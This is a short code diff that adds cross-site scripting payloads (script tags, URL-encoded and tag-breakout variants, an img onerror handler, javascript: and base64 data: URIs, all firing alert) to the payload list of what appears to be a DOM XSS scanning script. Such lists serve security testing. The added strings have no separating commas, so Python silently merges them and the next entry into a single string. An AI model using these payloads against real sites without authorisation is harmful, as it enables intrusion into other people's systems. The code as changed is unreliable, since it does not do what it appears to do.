@@ -21,6 +21,12 @@ os.makedirs(folder_path, exist_ok=True)
 file_path = os.path.join(folder_path, filename)
 
 dom_payload = [
+    "<script>alert(1)</script>"
+    "%3Cscript%3Ealert(1)%3C%2Fscript%3E"
+    "><script>alert(1)</script>"
+    "><img src=x onerror=alert(1)>"
+    "javascript:alert(1)"
+    "data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="
     "#<img src=x onerror=alert(1337)>",
     "#<svg onload=alert(1337)>",
     "#<body onload=alert(1337)>",
